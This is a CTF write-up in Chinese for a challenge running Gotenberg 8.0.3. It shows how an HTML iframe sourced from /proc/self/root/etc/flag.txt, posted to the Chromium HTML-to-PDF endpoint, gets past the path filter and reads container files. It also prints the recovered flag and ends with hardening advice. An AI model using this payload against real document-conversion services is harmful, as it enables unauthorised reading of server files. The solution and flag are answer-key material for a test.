# hah got em

## 题目简述

题目容器直接使用 Gotenberg 8.0.3，并将 flag 复制到 `/etc/flag.txt`。该版本的 HTML-to-PDF 转换组件对本地资源路径的限制可被绕过，使上传的 HTML 在渲染进程中读取容器文件。这是 Web 服务文件读取问题，而非 PDF 格式解析题。

## 解题过程

构造一个需要由 Chromium 渲染的 HTML。官方解法给出了两个绕过形式；`/proc/self/root` 指向当前进程可见文件系统的根目录，因而能避开对普通绝对路径的过滤：

```html
<html>
  <body>
    <iframe src="/proc/self/root/etc/flag.txt"></iframe>
  </body>
</html>
```

将 HTML 作为 multipart 字段 `files` 提交到 Chromium HTML 转 PDF 接口 `/forms/chromium/convert/html`，下载其 PDF 响应并读取 iframe 渲染出来的文本。仓库附带的单页 `sol.pdf` 已逐页视觉核对：页面上下各渲染了一次同样的完整 flag，没有被裁切或漏字。由于该页只承载可复制文本，正文直接转写结果，不再保留 PDF 截图。源码中的 `/etc/flag.txt` 内容为：

```text
DUCTF{dEeZ_r3GeX_cHeCK5_h4h_g0t_eM}
```

## 方法总结

文档转换服务应运行在最小权限、无敏感文件的隔离环境中，并禁止所有本地文件及网络资源加载；仅靠字符串或正则阻断 `/etc/` 不能覆盖 `/proc/self/root`、UNC 路径、符号链接等等价路径。对于依赖渲染产物的题目，复现时还应逐页检查生成 PDF，确认被嵌入的资源确实以完整文本出现。
